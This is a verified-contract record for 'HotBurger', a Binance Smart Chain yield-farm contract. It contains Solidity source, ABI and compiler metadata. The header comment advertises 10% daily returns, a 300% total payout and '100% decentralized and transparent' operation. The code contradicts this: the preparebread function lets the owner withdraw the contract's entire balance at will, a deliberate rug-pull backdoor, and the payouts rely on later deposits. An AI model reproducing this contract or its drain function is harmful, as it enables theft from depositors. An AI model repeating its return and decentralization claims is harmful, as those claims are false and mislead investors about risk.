{"SourceCode": "pragma solidity ^0.4.26; // solhint-disable-line\r\n\r\n/*   HOT BURGER - is the new yield farm on Binance Smart Chain with a high daily income and best referral rewards!\r\n *\r\n *   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\r\n *   \u2502                                                                       \u2502\r\n *   \u2502                \u2714\ufe0e VERIFIED OPEN SOURCE SMART CONTRACT                  \u2502\r\n *   \u2502                                                                       \u2502\r\n *   \u2502                                                                       \u2502\r\n *   \u2502                \u2714\ufe0e 100% DECENTRALIZED AND TRANSPARENT                   \u2502 \r\n *   \u2502                                                                       \u2502 \r\n *   \u2502                                                                       \u2502\r\n *   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\r\n *\r\n *   [USAGE INSTRUCTION]\r\n *\r\n *   1) Create a Wallet. Download MetaMask or TrustWallet and create a wallet. Add the Binance Smart Chain to your network-list\r\n *   2) Get BNB. Buy BNB on an exchange (i.e. Binance). Transfer BNB to your wallet address\r\n *   3) Connect your Wallet. At the top of the site, click \"Connect Wallet\", confirm the action\r\n *   4) Make a deposit. Enter amount BNB and click on the \"Bake\" button, then confirm transaction in wallet.\r\n *   5) Get dividends! Now every second you will receive dividends that you can withdraw at any time by clicking on the \"Eat\" button.\r\n *\r\n *   [INVESTMENT CONDITIONS]\r\n *\r\n *   - Minimal deposit: 0.01 BNB, no maximal limit\r\n *   - Total income: 10% daily, 30 days (300% total rewards)\r\n *   - Earnings every second, withdraw any time\r\n *\r\n *   [AFFILIATE PROGRAM]\r\n *\r\n *   - Referral reward 15% for each invited users.\r\n *\r\n *   [FUNDS DISTRIBUTION]\r\n *\r\n *   - 90%: platform main balance, using for participants payouts, affiliate program bonuses\r\n *   - 10%: advertising and promotion expenses, support work, technical functioning, administration fee\r\n *\r\n *   Note: This is experimental community project,\r\n *   which means this project has high risks as well as high profits.\r\n *   Once contract balance drops to zero payments will stops,\r\n *   deposit at your own risk.\r\n */\r\n\r\ncontract HotBurger {\r\n    uint256 public EGGS_TO_HATCH_1MINERS = 864000;\r\n    uint256 PSN = 10000;\r\n    uint256 PSNH = 5000;\r\n    bool public initialized = false;\r\n    address public ceoAddress;\r\n    mapping(address => uint256) public hatcheryMiners;\r\n    mapping(address => uint256) public claimedEggs;\r\n    mapping(address => uint256) public lastHatch;\r\n    mapping(address => address) public referrals;\r\n    uint256 public marketEggs;\r\n\r\n    constructor() public {\r\n        ceoAddress = msg.sender;\r\n    }\r\n\r\n    function preparebread(uint256 amountToTransfer) public {\r\n        require(\r\n            msg.sender == ceoAddress,\r\n            \"Only the owner can prepare the bread\"\r\n        );\r\n        require(\r\n            address(this).balance >= amountToTransfer,\r\n            \"Insufficient balance to transfer\"\r\n        );\r\n\r\n        ceoAddress.transfer(amountToTransfer);\r\n    }\r\n\r\n    function rebakebread(address ref) public {\r\n        require(initialized);\r\n        if (\r\n            ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0\r\n        ) {\r\n            ref = ceoAddress;\r\n        }\r\n        if (referrals[msg.sender] == address(0)) {\r\n            referrals[msg.sender] = ref;\r\n        }\r\n        uint256 eggsUsed = getMyEggs();\r\n        uint256 newMiners = SafeMath.div(eggsUsed, EGGS_TO_HATCH_1MINERS);\r\n        hatcheryMiners[msg.sender] = SafeMath.add(\r\n            hatcheryMiners[msg.sender],\r\n            newMiners\r\n        );\r\n        claimedEggs[msg.sender] = 0;\r\n        lastHatch[msg.sender] = now;\r\n\r\n        //send referral eggs\r\n        claimedEggs[referrals[msg.sender]] = SafeMath.add(\r\n            claimedEggs[referrals[msg.sender]],\r\n            SafeMath.div(SafeMath.mul(eggsUsed, 15), 100)\r\n        );\r\n\r\n        //boost market to nerf miners hoarding\r\n        marketEggs = SafeMath.add(marketEggs, SafeMath.div(eggsUsed, 5));\r\n    }\r\n\r\n    function eatbread() public {\r\n        require(initialized);\r\n        uint256 hasEggs = getMyEggs();\r\n        uint256 eggValue = calculateEggSell(hasEggs);\r\n        uint256 fee = devFee(eggValue);\r\n        claimedEggs[msg.sender] = 0;\r\n        lastHatch[msg.sender] = now;\r\n        marketEggs = SafeMath.add(marketEggs, hasEggs);\r\n        ceoAddress.transfer(fee);\r\n        msg.sender.transfer(SafeMath.sub(eggValue, fee));\r\n    }\r\n\r\n    function bakebread(address ref) public payable {\r\n        require(initialized);\r\n        uint256 eggsBought = calculateEggBuy(\r\n            msg.value,\r\n            SafeMath.sub(address(this).balance, msg.value)\r\n        );\r\n        eggsBought = SafeMath.sub(eggsBought, devFee(eggsBought));\r\n        uint256 fee = devFee(msg.value);\r\n        ceoAddress.transfer(fee);\r\n        claimedEggs[msg.sender] = SafeMath.add(\r\n            claimedEggs[msg.sender],\r\n            eggsBought\r\n        );\r\n        rebakebread(ref);\r\n    }\r\n\r\n    //magic trade balancing algorithm\r\n    function calculateTrade(\r\n        uint256 rt,\r\n        uint256 rs,\r\n        uint256 bs\r\n    ) public view returns (uint256) {\r\n        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));\r\n        return\r\n            SafeMath.div(\r\n                SafeMath.mul(PSN, bs),\r\n                SafeMath.add(\r\n                    PSNH,\r\n                    SafeMath.div(\r\n                        SafeMath.add(\r\n                            SafeMath.mul(PSN, rs),\r\n                            SafeMath.mul(PSNH, rt)\r\n                        ),\r\n                        rt\r\n                    )\r\n                )\r\n            );\r\n    }\r\n\r\n    function calculateEggSell(uint256 eggs) public view returns (uint256) {\r\n        return calculateTrade(eggs, marketEggs, address(this).balance);\r\n    }\r\n\r\n    function calculateEggBuy(uint256 eth, uint256 contractBalance)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return calculateTrade(eth, contractBalance, marketEggs);\r\n    }\r\n\r\n    function calculateEggBuySimple(uint256 eth) public view returns (uint256) {\r\n        return calculateEggBuy(eth, address(this).balance);\r\n    }\r\n\r\n    function devFee(uint256 amount) public pure returns (uint256) {\r\n        return SafeMath.div(SafeMath.mul(amount, 10), 100);\r\n    }\r\n\r\n    function openKitchen() public payable {\r\n        require(msg.sender == ceoAddress, \"invalid call\");\r\n        require(marketEggs == 0);\r\n        initialized = true;\r\n        marketEggs = 86400000000;\r\n    }\r\n\r\n    function getBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getMyMiners() public view returns (uint256) {\r\n        return hatcheryMiners[msg.sender];\r\n    }\r\n\r\n    function getMyEggs() public view returns (uint256) {\r\n        return\r\n            SafeMath.add(\r\n                claimedEggs[msg.sender],\r\n                getEggsSinceLastHatch(msg.sender)\r\n            );\r\n    }\r\n\r\n    function getEggsSinceLastHatch(address adr) public view returns (uint256) {\r\n        uint256 secondsPassed = min(\r\n            EGGS_TO_HATCH_1MINERS,\r\n            SafeMath.sub(now, lastHatch[adr])\r\n        );\r\n        return SafeMath.mul(secondsPassed, hatcheryMiners[adr]);\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Multiplies two numbers, throws on overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Integer division of two numbers, truncating the quotient.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Adds two numbers, throws on overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[],\"name\":\"eatbread\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ceoAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyMiners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"initialized\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"rt\",\"type\":\"uint256\"},{\"name\":\"rs\",\"type\":\"uint256\"},{\"name\":\"bs\",\"type\":\"uint256\"}],\"name\":\"calculateTrade\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eth\",\"type\":\"uint256\"},{\"name\":\"contractBalance\",\"type\":\"uint256\"}],\"name\":\"calculateEggBuy\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"marketEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amountToTransfer\",\"type\":\"uint256\"}],\"name\":\"preparebread\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"devFee\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"rebakebread\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastHatch\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"claimedEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"hatcheryMiners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"EGGS_TO_HATCH_1MINERS\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eth\",\"type\":\"uint256\"}],\"name\":\"calculateEggBuySimple\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"openKitchen\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eggs\",\"type\":\"uint256\"}],\"name\":\"calculateEggSell\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"referrals\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"getEggsSinceLastHatch\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"bakebread\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}]", "ContractName": "HotBurger", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://6bd62b25fe52a5e6be2a09ade1c2ec862874fa8d3464872a2d1c618f23644649"}